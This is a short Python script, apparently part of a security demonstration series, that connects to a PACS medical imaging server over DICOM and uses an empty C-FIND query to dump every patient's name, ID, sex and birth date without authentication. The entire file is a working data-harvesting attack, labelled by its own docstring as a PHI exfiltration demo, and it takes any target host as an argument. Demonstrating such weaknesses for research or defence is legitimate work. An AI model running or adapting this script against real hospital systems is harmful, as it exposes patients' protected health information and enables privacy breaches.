"""C-FIND: enumerate patients from the PACS (PHI exfiltration demo).

An empty query with QueryRetrieveLevel=PATIENT returns every patient the
PACS knows about -- name, ID, sex, birth date -- with no authentication.
Usage: python 02_c_find_enum.py [host] [port]
"""
import os
import sys

from pydicom.dataset import Dataset
from pynetdicom import AE
from pynetdicom.sop_class import PatientRootQueryRetrieveInformationModelFind

HOST = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("PACS_HOST", "127.0.0.1")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PACS_PORT", "4242"))

ae = AE()
ae.add_requested_context(PatientRootQueryRetrieveInformationModelFind)

print(f"[*] Querying {HOST}:{PORT} for all patients ...")
assoc = ae.associate(HOST, PORT)

if not assoc.is_established:
    print("[-] Association rejected.")
    sys.exit(1)

ds = Dataset()
ds.QueryRetrieveLevel = "PATIENT"
ds.PatientName = ""
ds.PatientID = ""
ds.PatientSex = ""
ds.PatientBirthDate = ""

responses = assoc.send_c_find(
    ds, PatientRootQueryRetrieveInformationModelFind
)

count = 0
for status, identifier in responses:
    if status and status.Status in (0x0000, 0xFF00):
        if identifier:
            count += 1
            print(
                f"    {str(getattr(identifier, 'PatientName', '?')):<16} "
                f"ID={getattr(identifier, 'PatientID', '?'):<6} "
                f"sex={getattr(identifier, 'PatientSex', '?'):<2} "
                f"dob={getattr(identifier, 'PatientBirthDate', '?')}"
            )

print(f"[+] {count} patient record(s) returned. No credentials were needed.")
assoc.release()
